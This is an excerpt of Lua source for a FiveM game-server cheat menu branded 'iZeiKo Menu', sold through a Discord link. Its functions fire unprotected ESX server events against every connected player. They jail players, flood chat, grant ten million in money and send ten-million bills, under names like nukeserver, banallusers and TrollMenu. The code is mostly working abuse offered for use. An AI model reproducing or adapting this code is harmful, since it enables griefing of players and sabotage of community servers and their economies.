...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordRichPresenceAsset("RIP")

            --(11-11-2018) New Natives:

            --Here you can add hover text for the "large" icon.
            SetDiscordRichPresenceAssetText("RIP")

            --Here you will have to put the image name for the "small" icon.
            SetDiscordRichPresenceAssetSmall("RIP")

            --Here you can add hover text for the "small" icon.
            SetDiscordRichPresenceAssetSmallText("RIP")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"RIP6")
        end
    ...
    function()
        while true do
			...
			if chatspam then
                ...
                TriggerServerEvent('_chat:messageEntered', 'RIP', {0, 0x99, 255}, 'RIP')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "RIP")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "RIP")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."RIP")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "RIP6 ", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."RIP")
				end
			end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "DAMM")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~b~https://discord.gg/WUxumbv")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iZeiKo Menu https://discord.gg/WUxumbv", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iZeiKo Menu https://discord.gg/WUxumbv", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iZeiKo Menu https://discord.gg/WUxumbv", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iZeiKo Menu https://discord.gg/WUxumbv", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iZeiKo Menu https://discord.gg/WUxumbv", "6969696969")
                end
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "iZeiKo")
                    else
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
                    if Plane.Button("~r~~h~iZeiKo👺🤯#6666 - Owner & Developer") then
                   drawNotification("~h~<FONT COLOR='#ff0000'>Ajoute Moi!~s~")
                   drawNotification("~h~<FONT COLOR='#ff00ec'>Pour Acheter <3 ~s~")
                   drawNotification("~h~<FONT COLOR='#9b00ff'>https://discord.gg/WUxumbv~s~")
